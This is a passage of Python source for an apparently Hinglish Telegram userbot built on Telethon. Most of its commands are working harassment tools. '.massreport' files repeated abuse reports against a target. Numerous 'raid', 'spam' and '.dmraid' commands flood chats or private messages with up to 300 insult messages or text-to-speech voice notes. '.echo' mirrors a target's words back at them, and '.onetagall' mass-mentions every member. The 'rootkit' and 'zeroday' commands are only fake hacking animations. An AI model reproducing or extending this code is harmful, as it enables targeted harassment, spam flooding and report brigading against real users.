            "┏━「 📋 **REPORT REASONS** 」━┓\n"
            "┃ • `spam` — Unwanted spam / bulk msgs\n"
            "┃ • `scam` — Fraud / phishing / scam\n"
            "┃ • `fake` — Fake account / impersonation\n"
            "┃ • `porn` — Adult / explicit content\n"
            "┃ • `violence` — Violent / harmful content\n"
            "┃ • `copyright` — Copyright violation\n"
            "┃ • `other` — General / other issue\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛"
        )

    @ubot.on(events.NewMessage(pattern=r'^\.report(?:\s+([\s\S]+))?$', outgoing=True))
    async def report_target_cmd(event):
        raw_args = (event.pattern_match.group(1) or "").strip()
        parts = raw_args.split(maxsplit=1)
        reply_msg = await event.get_reply_message() if event.is_reply else None
        reason_key = "other"
        note_text = ""

        if reply_msg:
            if reply_msg.sender_id:
                try:
                    target_peer = await ubot.get_entity(reply_msg.sender_id)
                except Exception:
                    target_peer = reply_msg.sender_id
            else:
                target_peer = event.chat_id

            if parts and parts[0].lower() in REPORT_REASON_MAP:
                reason_key = parts[0].lower()
                note_text = parts[1].strip() if len(parts) > 1 else ""
            elif raw_args:
                note_text = raw_args
        else:
            if not parts:
                await event.edit(
                    "ℹ️ **Istemaal:**\n"
                    "• Reply karke: `.report [spam/scam/fake/other] [note]`\n"
                    "• Ya bina reply ke: `.report @username [spam/scam/fake/other] [note]`"
                )
                return

            first_token = parts[0].strip()
            peer_candidate = int(first_token) if first_token.lstrip("-").isdigit() else first_token
            try:
                target_peer = await ubot.get_entity(peer_candidate)
            except Exception as e:
                await event.edit(f"❌ **Target nahi mila:** `{e}`")
                return

            rest = parts[1].strip() if len(parts) > 1 else ""
            rest_parts = rest.split(maxsplit=1)
            if rest_parts and rest_parts[0].lower() in REPORT_REASON_MAP:
                reason_key = rest_parts[0].lower()
                note_text = rest_parts[1].strip() if len(rest_parts) > 1 else ""
            else:
                note_text = rest

        try:
            chat_ent = await ubot.get_entity(event.chat_id)
            await _submit_single_report(chat_ent, reply_msg, target_peer, reason_key, note_text)
            target_label = getattr(target_peer, "username", None)
            target_display = f"@{target_label}" if target_label else str(getattr(target_peer, "id", target_peer))
            await event.edit(f"🚨 **Report submit ho gayi!**\n• **Target:** `{target_display}`\n• **Reason:** `{reason_key}`")
        except FloodWaitError as f:
            await event.edit(f"⏳ **FloodWait:** `{f.seconds}s` baad try karein.")
        except Exception as e:
            await event.edit(f"❌ **Report fail:** `{e}`")

    @ubot.on(events.NewMessage(pattern=r'^\.(spamreport|scamreport|fakereport)(?:\s+([\s\S]+))?$', outgoing=True))
    async def quick_reason_report_cmd(event):
        cmd_name = event.pattern_match.group(1)
        reason_map = {
            "spamreport": "spam",
            "scamreport": "scam",
            "fakereport": "fake",
        }
        reason_key = reason_map[cmd_name]
        extra_note = (event.pattern_match.group(2) or "").strip()

        chat_id, reply_msg, target_peer, note_text = await _resolve_report_target(event, extra_note)
        if not target_peer:
            await event.edit(f"ℹ️ **Istemaal:** Reply karein ya `.{cmd_name} @username [note]` likhein.")
            return

        try:
            chat_ent = await ubot.get_entity(chat_id) if chat_id is not None else None
            await _submit_single_report(chat_ent, reply_msg, target_peer, reason_key, note_text)
            uname = getattr(target_peer, "username", None)
            label = f"@{uname}" if uname else str(getattr(target_peer, "id", target_peer))
            await event.edit(f"🚨 **`{reason_key.upper()}` report bhej di gayi:** `{label}`")
        except FloodWaitError as f:
            await event.edit(f"⏳ **FloodWait:** `{f.seconds}s` baad try karein.")
        except Exception as e:
            await event.edit(f"❌ **Report fail:** `{e}`")

    @ubot.on(events.NewMessage(pattern=r'^\.chatreport(?:\s+([\s\S]+))?$', outgoing=True))
    async def chat_report_cmd(event):
        raw_arg = (event.pattern_match.group(1) or "").strip()
        parts = raw_arg.split(maxsplit=1)
        reason_key = "other"
        note_text = ""

        if parts and parts[0].lower() in REPORT_REASON_MAP:
            reason_key = parts[0].lower()
            note_text = parts[1].strip() if len(parts) > 1 else ""
        elif raw_arg:
            note_text = raw_arg

        try:
            chat_ent = await ubot.get_entity(event.chat_id)
            input_peer = await ubot.get_input_entity(chat_ent)
            await ubot(ReportPeerRequest(
                peer=input_peer,
                reason=REPORT_REASON_MAP.get(reason_key, InputReportReasonOther()),
                message=note_text or f"Chat reported via {BOT_BRAND}",
            ))
            title = getattr(chat_ent, "title", getattr(chat_ent, "first_name", str(event.chat_id)))
            await event.edit(f"🚨 **Chat report submit ho gayi:** `{title}` (`{reason_key}`)")
        except FloodWaitError as f:
            await event.edit(f"⏳ **FloodWait:** `{f.seconds}s` baad try karein.")
        except Exception as e:
            await event.edit(f"❌ **Chat report fail:** `{e}`")

    @ubot.on(events.NewMessage(pattern=r'^\.massreport(?:\s+([\s\S]+))?$', outgoing=True))
    async def mass_report_cmd(event):
        raw_arg = (event.pattern_match.group(1) or "").strip()
        parts = raw_arg.split()
        count = 3
        rem_tokens = parts

        if parts and parts[0].isdigit():
            count = max(1, min(int(parts[0]), 10))
            rem_tokens = parts[1:]

        joined_rem = " ".join(rem_tokens).strip()
        chat_id, reply_msg, target_peer, rest_after_target = await _resolve_report_target(event, joined_rem)
        if not target_peer:
            await event.edit("ℹ️ **Istemaal:** Reply karein ya `.massreport [1-10] [@username] [reason] [note]` likhein.")
            return

        rest_parts = rest_after_target.split(maxsplit=1)
        reason_key = "other"
        note_text = ""
        if rest_parts and rest_parts[0].lower() in REPORT_REASON_MAP:
            reason_key = rest_parts[0].lower()
            note_text = rest_parts[1].strip() if len(rest_parts) > 1 else ""
        else:
            note_text = rest_after_target

        status_msg = await event.edit(f"🚨 **Mass report shuru (`{count}`x, reason: `{reason_key}`)...**")
        sent_ok = 0
        chat_ent = await ubot.get_entity(chat_id) if chat_id is not None else None

        for _ in range(count):
            try:
                await _submit_single_report(chat_ent, reply_msg, target_peer, reason_key, note_text)
                sent_ok += 1
                await asyncio.sleep(1.0)
            except FloodWaitError as f:
                await asyncio.sleep(f.seconds + 0.5)
                break
            except Exception:
                break

        await status_msg.edit(f"✅ **Mass report complete:** `{sent_ok}/{count}` (`{reason_key}`)")

    # WELCOME FEATURE: SET WELCOME WITH PIC & TEXT
    @ubot.on(events.NewMessage(outgoing=True, pattern=r'^\/welcome'))
    async def set_welcome_handler(event):
        chat_id = event.chat_id
        text_arg = event.raw_text.replace('/welcome', '').strip()

        if event.is_reply:
            reply = await event.get_reply_message()
            text = text_arg or (reply.text if reply and reply.text else "Swagat hai! 👋")
            if reply and reply.media:
                chat_welcomes[chat_id] = {'text': text, 'media': reply.media}
                await event.edit("✅ **Welcome photo aur message set ho gaya hai.**")
            else:
                chat_welcomes[chat_id] = {'text': text, 'media': None}
                await event.edit("✅ **Welcome message set ho gaya hai.**")
        elif event.media:
            text = text_arg or "Swagat hai! 👋"
            chat_welcomes[chat_id] = {'text': text, 'media': event.media}
            await event.edit("✅ **Welcome photo aur message set ho gaya hai.**")
        else:
            await event.edit("ℹ️ **Istemaal:** Photo ke saath `/welcome [text]` bhejein ya photo par reply karein.")

    # WELCOME TRIGGER ON NEW MEMBER
    @ubot.on(events.ChatAction)
    async def welcome_new_member(event):
        if event.user_joined or event.user_added:
            chat_id = event.chat_id
            if chat_id in chat_welcomes:
                w_data = chat_welcomes[chat_id]
                try:
                    if w_data['media']:
                        await ubot.send_file(chat_id, w_data['media'], caption=w_data['text'])
                    else:
                        await ubot.send_message(chat_id, w_data['text'])
                except Exception:
                    pass

    # 1. AUTO-REACT (A): Self Messages Auto-React
    @ubot.on(events.NewMessage(outgoing=True))
    async def self_react_handler(event):
        if owner_id in afk_status and not event.raw_text.startswith(".afk"):
            afk_status.pop(owner_id, None)
        raw = (event.raw_text or "").strip()
        if raw.startswith(".") or raw.startswith("/"):
            return
        chat_id = event.chat_id
        if chat_id in self_reacts:
            await send_tg_reaction(chat_id, event.id, self_reacts[chat_id])

    @ubot.on(events.NewMessage(pattern=r'^\.ar\b', outgoing=True))
    async def ar_command(event):
        args = event.raw_text.split(maxsplit=1)
        chat_id = event.chat_id
        if len(args) < 2 or not args[1].strip():
            await event.edit("ℹ️ **Istemaal:** `.ar 🔥`")
            return
        emoji = args[1].strip().split()[0]
        ok = await send_tg_reaction(chat_id, event.id, emoji)
        if ok:
            self_reacts[chat_id] = emoji
            await event.edit(f"✅ **Self Auto-React chalu:** {emoji}")
        else:
            await event.edit(f"❌ **Reaction nahi lag paaya (`{emoji}`). Kisi doosre emoji se try karein.**")

    @ubot.on(events.NewMessage(pattern=r'^\.dar$', outgoing=True))
    async def dar_command(event):
        chat_id = event.chat_id
        if chat_id in self_reacts:
            del self_reacts[chat_id]
            await event.edit("🛑 **Self Auto-React band kar diya gaya hai.**")
        else:
            await event.edit("ℹ️ Yahan Self Auto-React chalu nahi hai.")

    # 2. AUTO-REACT (B): Target User Auto-React with '🔥'
    @ubot.on(events.NewMessage(incoming=True))
    async def uar_incoming_handler(event):
        chat_id = event.chat_id
        sender_id = event.sender_id
        if chat_id in user_react_targets and sender_id in user_react_targets[chat_id]:
            await send_tg_reaction(chat_id, event.id, "🔥")

    @ubot.on(events.NewMessage(pattern=r'^\.uar\b', outgoing=True))
    async def uar_command(event):
        chat_id = event.chat_id
        args = event.raw_text.split()
        target_user = None

        if event.is_reply:
            reply_msg = await event.get_reply_message()
            target_user = reply_msg.sender_id
        elif len(args) > 1:
            username = args[1]
            try:
                user_entity = await ubot.get_entity(username)
                target_user = user_entity.id
            except Exception:
                await event.edit("❌ **User ya username sahi nahi hai.**")
                return

        if target_user:
            if chat_id not in user_react_targets:
                user_react_targets[chat_id] = set()
            user_react_targets[chat_id].add(target_user)
            await event.edit("✅ **Target User Auto-React (`🔥`) chalu ho gaya hai.**")
        else:
            await event.edit("ℹ️ **Istemaal:** Kisi message par reply karein ya `.uar @username` likhein.")

    @ubot.on(events.NewMessage(pattern=r'^\.duar$', outgoing=True))
    async def duar_command(event):
        chat_id = event.chat_id
        if chat_id in user_react_targets:
            del user_react_targets[chat_id]
            await event.edit("🛑 **User Auto-React band kar diya gaya hai.**")
        else:
            await event.edit("ℹ️ Is chat mein koi User Auto-React chalu nahi hai.")

    # 3. AUTO-REACT (C): All Messages Auto-React with selected reactions
    @ubot.on(events.NewMessage(incoming=True))
    async def rar_incoming_handler(event):
        chat_id = event.chat_id
        if chat_id in all_reacts and all_reacts[chat_id]:
            emoji = random.choice(all_reacts[chat_id])
            await send_tg_reaction(chat_id, event.id, emoji)

    @ubot.on(events.NewMessage(pattern=r'^\.rar\b', outgoing=True))
    async def rar_command(event):
        args = event.raw_text.split()
        chat_id = event.chat_id
        emojis = [e.strip() for e in args[1:] if e.strip()]
        if not emojis:
            await event.edit("ℹ️ **Istemaal:** `.rar 🔥 💀 ⚡`")
            return
        ok = await send_tg_reaction(chat_id, event.id, emojis[0])
        if ok:
            all_reacts[chat_id] = emojis
            await event.edit(f"✅ **All-Message Auto-React chalu:** {' '.join(emojis)}")
        else:
            await event.edit(f"❌ **All-Message Auto-React set nahi ho saka (`{emojis[0]}`).**")

    @ubot.on(events.NewMessage(pattern=r'^\.drar$', outgoing=True))
    async def drar_command(event):
        chat_id = event.chat_id
        if chat_id in all_reacts:
            del all_reacts[chat_id]
            await event.edit("🛑 **All-Message Auto-React band kar diya gaya hai.**")
        else:
            await event.edit("ℹ️ Is chat mein All-Message Auto-React chalu nahi hai.")

    # 4. REPLY RAID (.rraid / .drraid) & MIRROR ECHO (.echo / .decho)
    @ubot.on(events.NewMessage(pattern=r'^\.rraid$', outgoing=True))
    async def rraid_start_cmd(event):
        if not event.is_reply:
            await event.edit("ℹ️ **Kisi message par reply karke `.rraid` likhein.**")
            return
        reply = await event.get_reply_message()
        if not reply.sender_id:
            await event.edit("❌ **Target user ID nahi mil saki.**")
            return
        rraid_targets.add((event.chat_id, reply.sender_id))
        await event.edit(f"✅ **RRAID chalu (`{reply.sender_id}`).**")

    @ubot.on(events.NewMessage(pattern=r'^\.drraid$', outgoing=True))
    async def rraid_stop_cmd(event):
        if event.is_reply:
            reply = await event.get_reply_message()
            rraid_targets.discard((event.chat_id, reply.sender_id))
            await event.edit(f"🛑 **RRAID band (`{reply.sender_id}`).**")
        else:
            for item in [x for x in rraid_targets if x[0] == event.chat_id]:
                rraid_targets.discard(item)
            await event.edit("🛑 **Is chat ke saare RRAID band kar diye gaye hain.**")

    @ubot.on(events.NewMessage(incoming=True))
    async def rraid_watcher(event):
        if event.sender_id and (event.chat_id, event.sender_id) in rraid_targets:
            try:
                await event.reply(random.choice(GAALIS))
            except FloodWaitError as f:
                await asyncio.sleep(f.seconds + 0.5)
            except Exception:
                pass

    @ubot.on(events.NewMessage(pattern=r'^\.echo$', outgoing=True))
    async def echo_start_cmd(event):
        if not event.is_reply:
            await event.edit("ℹ️ **Kisi message par reply karke `.echo` likhein.**")
            return
        reply = await event.get_reply_message()
        if not reply.sender_id:
            await event.edit("❌ **Target user ID nahi mil saki.**")
            return
        echo_targets.add((event.chat_id, reply.sender_id))
        await event.edit(f"🔁 **Mirror Echo chalu (`{reply.sender_id}`).**")

    @ubot.on(events.NewMessage(pattern=r'^\.decho$', outgoing=True))
    async def echo_stop_cmd(event):
        if event.is_reply:
            reply = await event.get_reply_message()
            echo_targets.discard((event.chat_id, reply.sender_id))
            await event.edit(f"🛑 **Mirror Echo band (`{reply.sender_id}`).**")
        else:
            for item in [x for x in echo_targets if x[0] == event.chat_id]:
                echo_targets.discard(item)
            await event.edit("🛑 **Is chat ke saare Mirror Echo band kar diye gaye hain.**")

    @ubot.on(events.NewMessage(incoming=True))
    async def echo_watcher(event):
        if event.sender_id and (event.chat_id, event.sender_id) in echo_targets:
            mirror_txt = (event.raw_text or "").strip()
            if not mirror_txt:
                return
            try:
                await event.reply(mirror_txt)
            except FloodWaitError as f:
                await asyncio.sleep(f.seconds + 0.5)
            except Exception:
                pass

    # 5. SPAM / FASTSPAM / FLOOD / SLOWSPAM / REVSPAM (LIMIT 300)
    async def _spam_worker(target_chat, count, text, delay, reverse_text=False):
        try:
            payload = text[::-1] if reverse_text else text
            for _ in range(count):
                if target_chat not in active_raids:
                    break
                try:
                    await ubot.send_message(target_chat, payload)
                except FloodWaitError as f:
                    await asyncio.sleep(f.seconds + 0.5)
                except Exception:
                    break
                if delay > 0:
                    await asyncio.sleep(delay)
        finally:
            active_raids.discard(target_chat)
            active_raid_tasks.pop(target_chat, None)

    @ubot.on(events.NewMessage(pattern=r'^\.(spam|fastspam|flood|slowspam|revspam)\b', outgoing=True))
    async def spam_cmd_handler(event):
        cmd = event.pattern_match.group(1)
        parts = event.raw_text.split(maxsplit=2)
        if len(parts) < 3 or not parts[1].isdigit():
            await event.edit(f"ℹ️ **Istemaal:** `.{cmd} [count] [text]`")
            return
        count = max(1, min(int(parts[1]), 300))
        text = parts[2]
        delay_map = {
            "fastspam": 0.05,
            "flood": 0.15,
            "spam": 0.25,
            "slowspam": 1.5,
            "revspam": 0.2,
        }
        delay = delay_map.get(cmd, 0.25)

        if event.chat_id in active_raid_tasks:
            active_raid_tasks[event.chat_id].cancel()
        active_raids.add(event.chat_id)
        try:
            await event.delete()
        except Exception:
            pass
        task = asyncio.create_task(_spam_worker(event.chat_id, count, text, delay, reverse_text=(cmd == "revspam")))
        active_raid_tasks[event.chat_id] = task

    # 6. RAID & ONERAID (.raid / .oneraid — LIMIT 300)
    async def _basic_raid_worker(target_chat, reply_to, count, single_only=False):
        try:
            for _ in range(count):
                if target_chat not in active_raids:
                    break
                msg = random.choice(SINGLE_GAALIS) if single_only else random.choice(GAALIS)
                try:
                    if reply_to:
                        await ubot.send_message(target_chat, msg, reply_to=reply_to)
                    else:
                        await ubot.send_message(target_chat, msg)
                except FloodWaitError as f:
                    await asyncio.sleep(f.seconds + 0.5)
                except Exception:
                    break
                await asyncio.sleep(0.2)
        finally:
            active_raids.discard(target_chat)
            active_raid_tasks.pop(target_chat, None)

    @ubot.on(events.NewMessage(pattern=r'^\.(raid|oneraid)\b', outgoing=True))
    async def basic_raid_handler(event):
        cmd = event.pattern_match.group(1)
        parts = event.raw_text.split(maxsplit=1)
        count = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 15
        count = max(1, min(count, 300))

        if event.chat_id in active_raid_tasks:
            active_raid_tasks[event.chat_id].cancel()
        active_raids.add(event.chat_id)
        try:
            await event.delete()
        except Exception:
            pass
        task = asyncio.create_task(_basic_raid_worker(event.chat_id, event.reply_to_msg_id, count, single_only=(cmd == "oneraid")))
        active_raid_tasks[event.chat_id] = task

    # 7. LANGUAGE RAIDS (.engraid / .praid / .braid — LIMIT 300)
    async def _multi_lang_raid_worker(target_chat, reply_to, count, pool):
        try:
            for _ in range(count):
                if target_chat not in active_raids:
                    break
                msg = random.choice(pool)
                try:
                    if reply_to:
                        await ubot.send_message(target_chat, msg, reply_to=reply_to)
                    else:
                        await ubot.send_message(target_chat, msg)
                except FloodWaitError as f:
                    await asyncio.sleep(f.seconds + 0.5)
                except Exception:
                    break
                await asyncio.sleep(0.2)
        finally:
            active_raids.discard(target_chat)
            active_raid_tasks.pop(target_chat, None)

    @ubot.on(events.NewMessage(pattern=r'^\.(engraid|praid|braid)\b', outgoing=True))
    async def multi_lang_raid_handler(event):
        cmd = event.pattern_match.group(1)
        parts = event.raw_text.split(maxsplit=1)
        count = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 15
        count = max(1, min(count, 300))

        pools = {
            "engraid": ENGLISH_RAIDS,
            "praid": PUNJABI_RAIDS,
            "braid": BENGALI_RAIDS,
        }
        pool = pools[cmd]

        if event.chat_id in active_raid_tasks:
            active_raid_tasks[event.chat_id].cancel()
        active_raids.add(event.chat_id)
        try:
            await event.delete()
        except Exception:
            pass
        task = asyncio.create_task(_multi_lang_raid_worker(event.chat_id, event.reply_to_msg_id, count, pool))
        active_raid_tasks[event.chat_id] = task

    # 8. STYLED, TAG, SSRAID, EXTRARAID, TTSRAID & SPECIAL RAIDS (LIMIT 300)
    def _build_raid_payload(mode, event, custom_text=None):
        if custom_text:
            return custom_text
        base = random.choice(GAALIS)
        if mode == "araid":
            return format_araid(base)
        if mode == "saraid":
            return format_saraid(random.choice(SINGLE_GAALIS))
        if mode == "oaraid":
            return format_oaraid(base)
        if mode == "faraid":
            return format_faraid(random.choice(SINGLE_GAALIS))
        if mode == "earaid":
            return random.choice(EARAID_LIST)
        if mode == "mraid":
            return random.choice(MULTI_LINE_RAIDS)
        if mode == "emoraid":
            return f"{random.choice(RAID_EMOJIS)} {base} {random.choice(RAID_EMOJIS)}"
        if mode == "capsraid":
            return base.upper()
        if mode == "tagraid":
            return f"{base} @everyone"
        if mode == "badaid":
            return f"═══『 ⚡ KASHYAP RAID ⚡ 』═══\n{base}\n════════════════════════════"
        if mode == "saraid2":
            return f"⚡ {format_saraid(random.choice(SINGLE_GAALIS))} ⚡"
        if mode == "ultraid":
            return f"🔥💣 {base.upper()} 💣🔥"
        if mode == "ssraid":
            return random.choice(SCREENSHOT_AND_EXTRA_RAIDS)
        if mode == "extraraid":
            return random.choice(EXTRA_RAIDS)
        if mode == "mixraid":
            choice = random.choice(["a", "s", "o", "f", "e", "m", "x"])
            return _build_raid_payload(
                {"a": "araid", "s": "saraid", "o": "oaraid", "f": "faraid", "e": "earaid", "m": "mraid", "x": "extraraid"}[choice],
                event
            )
        return base

    async def _generic_raid_worker(target_chat, reply_to, count, mode, delay=0.2, custom_text=None):
        try:
            for _ in range(count):
                if target_chat not in active_raids:
                    break
                payload = _build_raid_payload(mode, None, custom_text=custom_text)
                try:
                    if reply_to:
                        await ubot.send_message(target_chat, payload, reply_to=reply_to)
                    else:
                        await ubot.send_message(target_chat, payload)
                except FloodWaitError as f:
                    await asyncio.sleep(f.seconds + 0.5)
                except Exception:
                    break
                if delay > 0:
                    await asyncio.sleep(delay)
        finally:
            active_raids.discard(target_chat)
            active_raid_tasks.pop(target_chat, None)

    @ubot.on(events.NewMessage(pattern=r'^\.(araid|saraid|oaraid|faraid|earaid|mraid|emoraid|mixraid|tagraid|capsraid|slowraid|badaid|saraid2|ultraid|ssraid|extraraid)\b', outgoing=True))
    async def styled_raid_handler(event):
        cmd = event.pattern_match.group(1)
        parts = event.raw_text.split(maxsplit=1)
        default_cnt = 10 if cmd in ("mixraid", "tagraid", "capsraid", "slowraid") else 15
        max_cnt = 300
        count = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else default_cnt
        count = max(1, min(count, max_cnt))
        delay = 1.2 if cmd == "slowraid" else 0.22

        if event.chat_id in active_raid_tasks:
            active_raid_tasks[event.chat_id].cancel()
        active_raids.add(event.chat_id)
        try:
            await event.delete()
        except Exception:
            pass
        task = asyncio.create_task(_generic_raid_worker(event.chat_id, event.reply_to_msg_id, count, cmd, delay=delay))
        active_raid_tasks[event.chat_id] = task

    async def _ttsraid_worker(target_chat, reply_to, vn_count, base_text):
        try:
            for i in range(vn_count):
                if target_chat not in active_raids:
                    break
                spoken = base_text if base_text else random.choice(SINGLE_GAALIS)
                if not base_text and vn_count > 1:
                    spoken = f"{spoken} number {i + 1}"
                tmp_path = None
                try:
                    tmp_path = await synthesize_voice_file(spoken, preset_name="villain")
                    if reply_to:
                        await ubot.send_file(target_chat, tmp_path, voice_note=True, reply_to=reply_to)
                    else:
                        await ubot.send_file(target_chat, tmp_path, voice_note=True)
                except FloodWaitError as f:
                    await asyncio.sleep(f.seconds + 0.5)
                except Exception:
                    break
                finally:
                    if tmp_path and os.path.exists(tmp_path):
                        try:
                            os.remove(tmp_path)
                        except Exception:
                            pass
                await asyncio.sleep(0.45)
        finally:
            active_raids.discard(target_chat)
            active_raid_tasks.pop(target_chat, None)

    @ubot.on(events.NewMessage(pattern=r'^\.ttsraid\b', outgoing=True))
    async def ttsraid_handler(event):
        parts = event.raw_text.split(maxsplit=2)
        vn_count = random.choice([5, 6])
        custom_text = ""
        if len(parts) >= 2 and parts[1].isdigit():
            vn_count = max(5, min(int(parts[1]), 6))
            if len(parts) >= 3:
                custom_text = parts[2].strip()
        elif len(parts) >= 2:
            custom_text = " ".join(parts[1:]).strip()

        if not custom_text and event.is_reply:
            rep = await event.get_reply_message()
            custom_text = (rep.raw_text or "").strip() if rep else ""

        if event.chat_id in active_raid_tasks:
            active_raid_tasks[event.chat_id].cancel()
        active_raids.add(event.chat_id)
        try:
            await event.delete()
        except Exception:
            pass
        task = asyncio.create_task(_ttsraid_worker(event.chat_id, event.reply_to_msg_id, vn_count, custom_text))
        active_raid_tasks[event.chat_id] = task

    @ubot.on(events.NewMessage(pattern=r'^\.auracommand$', outgoing=True))
    async def auracommand_handler(event):
        sent_deck = await _send_bot_deck_via_ubot(event, open_extra=True)
        if not sent_deck:
            await event.edit(AURA_COMMAND_TEXT)

    @ubot.on(events.NewMessage(pattern=r'^\.delayraid\b', outgoing=True))
    async def delayraid_handler(event):
        parts = event.raw_text.split()
        if len(parts) < 3:
            await event.edit("ℹ️ **Istemaal:** `.delayraid [sec] [count]`")
            return
        try:
            delay = max(0.1, min(float(parts[1]), 60.0))
            count = max(1, min(int(parts[2]), 300))
        except ValueError:
            await event.edit("❌ **Delay aur count number mein dein.**")
            return

        if event.chat_id in active_raid_tasks:
            active_raid_tasks[event.chat_id].cancel()
        active_raids.add(event.chat_id)
        try:
            await event.delete()
        except Exception:
            pass
        task = asyncio.create_task(_generic_raid_worker(event.chat_id, event.reply_to_msg_id, count, "raid", delay=delay))
        active_raid_tasks[event.chat_id] = task

    @ubot.on(events.NewMessage(pattern=r'^\.emojispam\b', outgoing=True))
    async def emojispam_handler(event):
        parts = event.raw_text.split(maxsplit=3)
        if len(parts) < 4 or not parts[1].isdigit():
            await event.edit("ℹ️ **Istemaal:** `.emojispam [count] [emoji] [text]`")
            return
        count = max(1, min(int(parts[1]), 300))
        emo = parts[2]
        txt = f"{emo} {parts[3]} {emo}"
        if event.chat_id in active_raid_tasks:
            active_raid_tasks[event.chat_id].cancel()
        active_raids.add(event.chat_id)
        try:
            await event.delete()
        except Exception:
            pass
        task = asyncio.create_task(_spam_worker(event.chat_id, count, txt, 0.15))
        active_raid_tasks[event.chat_id] = task

    @ubot.on(events.NewMessage(pattern=r'^\.dmraid\b', outgoing=True))
    async def dmraid_handler(event):
        parts = event.raw_text.split(maxsplit=1)
        count = max(1, min(int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 10, 300))
        target_id = None
        if event.is_reply:
            rep = await event.get_reply_message()
            target_id = rep.sender_id
        elif event.is_private:
            target_id = event.chat_id
        if not target_id:
            await event.edit("ℹ️ **DM ya reply se `.dmraid [count]` chalayein.**")
            return
        await event.edit(f"🚀 **DM Raid shuru (`{count}` msgs)...**")
        for _ in range(count):
            if target_id not in active_raids and event.chat_id not in active_raids:
                break
            try:
                await ubot.send_message(target_id, random.choice(GAALIS))
            except FloodWaitError as f:
                await asyncio.sleep(f.seconds + 0.5)
            except Exception:
                break
            await asyncio.sleep(0.35)

    async def _onetagall_worker(target_chat, custom_text, delay=1.2):
        try:
            async for user in ubot.iter_participants(target_chat, limit=300):
                if target_chat not in active_raids:
                    break
                if getattr(user, "bot", False) or getattr(user, "deleted", False):
                    continue
                if getattr(user, "id", None) == owner_id:
                    continue
                name = (getattr(user, "first_name", None) or getattr(user, "username", None) or "User").strip()
                mention = f"[{name}](tg://user?id={user.id})"
                payload = f"{custom_text} {mention}".strip() if custom_text else mention
                try:
                    await ubot.send_message(target_chat, payload)
                except FloodWaitError as f:
                    await asyncio.sleep(f.seconds + 0.5)
                    try:
                        await ubot.send_message(target_chat, payload)
                    except Exception:
                        break
                except Exception:
                    break
                await asyncio.sleep(delay)
        finally:
            active_raids.discard(target_chat)
            active_raid_tasks.pop(target_chat, None)

    @ubot.on(events.NewMessage(pattern=r'^\.onetagall(?:\s+([\s\S]+))?$', outgoing=True))
    async def onetagall_cmd(event):
        if event.is_private:
            await event.edit("ℹ️ **`.onetagall` group/channel chat mein chalayein.**")
            return
        custom_text = (event.pattern_match.group(1) or "").strip()
        if not custom_text and event.is_reply:
            rep = await event.get_reply_message()
            custom_text = (rep.raw_text or "").strip() if rep else ""
        if not custom_text:
            await event.edit("ℹ️ **Istemaal:** `.onetagall jo bolna hai wo likhein` (ya reply karke `.onetagall` likhein).")
            return
        if event.chat_id in active_raid_tasks:
            active_raid_tasks[event.chat_id].cancel()
        active_raids.add(event.chat_id)
        try:
            await event.delete()
        except Exception:
            pass
        task = asyncio.create_task(_onetagall_worker(event.chat_id, custom_text, delay=1.2))
        active_raid_tasks[event.chat_id] = task

    @ubot.on(events.NewMessage(pattern=r'^\.auto\b', outgoing=True))
    async def auto_link_handler(event):
        parts = event.raw_text.split()
        if len(parts) < 3 or not parts[2].isdigit():
            await event.edit("ℹ️ **Istemaal:** `.auto [link] [count]`")
            return
        link = parts[1]
        count = max(1, min(int(parts[2]), 300))
        if event.chat_id in active_raid_tasks:
            active_raid_tasks[event.chat_id].cancel()
        active_raids.add(event.chat_id)
        try:
            await event.delete()
        except Exception:
            pass
        task = asyncio.create_task(_spam_worker(event.chat_id, count, f"⚡ {link} ⚡", 0.3))
        active_raid_tasks[event.chat_id] = task

    @ubot.on(events.NewMessage(pattern=r'^\.chup$', outgoing=True))
    async def chup_cmd(event):
        if event.is_reply:
            rep = await event.get_reply_message()
            if rep.sender_id:
                chup_muted_users.add(rep.sender_id)
                await event.edit(f"🤫 **User `{rep.sender_id}` chup list mein add ho gaya.**")
        else:
            await event.edit("ℹ️ **Kisi message par reply karke `.chup` likhein.**")

    @ubot.on(events.NewMessage(pattern=r'^\.bol$', outgoing=True))
    async def bol_cmd(event):
        if event.is_reply:
            rep = await event.get_reply_message()
            chup_muted_users.discard(rep.sender_id)
            await event.edit(f"🗣️ **User `{rep.sender_id}` chup list se hata diya gaya.**")
        else:
            chup_muted_users.clear()
            await event.edit("🗣️ **Chup list clear kar di gayi hai.**")

    @ubot.on(events.NewMessage(incoming=True))
    async def chup_watcher(event):
        if event.sender_id and event.sender_id in chup_muted_users:
            try:
                await event.delete()
            except Exception:
                pass

    # 9. HACK & ANIMATION (50s HACKS INCLUDED)
    async def _run_50s_hack(event, title, stages):
        msg = await event.edit(f"⚡ **{title} INITIATED (50s)...**")
        total = 50
        step_dur = 2.0
        steps_count = int(total / step_dur)
        for i in range(steps_count):
            pct = min(100, int(((i + 1) / steps_count) * 100))
            bar_len = 12
            filled = int((pct / 100) * bar_len)
            bar = "█" * filled + "░" * (bar_len - filled)
            stage_line = stages[i % len(stages)]
            try:
                await msg.edit(
                    f"┏━「 💀 **{title}** 」━┓\n"
                    f"┃ • **STATUS:** `{stage_line}`\n"
                    f"┃ • **PROGRESS:** `[{bar}] {pct}%`\n"
                    f"┃ • **TIME:** `{(i+1)*2}s / 50s`\n"
                    f"┗━━━━━━━━━━━━━━━━━━━━━━━━━┛"
                )
            except FloodWaitError as f:
                await asyncio.sleep(f.seconds + 0.5)
            except Exception:
                pass
            await asyncio.sleep(step_dur)
        await msg.edit(f"✅ **{title} COMPLETE (50s) — BY {OWNER_NAME}!**")

    @ubot.on(events.NewMessage(pattern=r'^\.(netghost|rootkit|cryptohack|zeroday)$', outgoing=True))
    async def hack_50s_handler(event):
        cmd = event.pattern_match.group(1).upper()
        pools = {
            "NETGHOST": ["GHOSTING SOCKET", "SPOOFING NODE", "BYPASSING RELAY", "MASKING TRACE"],
            "ROOTKIT": ["MOUNTING KERNEL HOOK", "ELEVATING PRIVILEGES", "HIDING PROCESS", "INJECTING MODULE"],
            "CRYPTOHACK": ["PROBING CIPHER", "TESTING KEYSPACE", "DECRYPTING BLOCKS", "VERIFYING HASH"],
            "ZERODAY": ["SCANNING EXPLOIT", "CRAFTING PAYLOAD", "TRIGGERING VECTOR", "GAINING SHELL"],
        }
        await _run_50s_hack(event, cmd, pools[cmd])

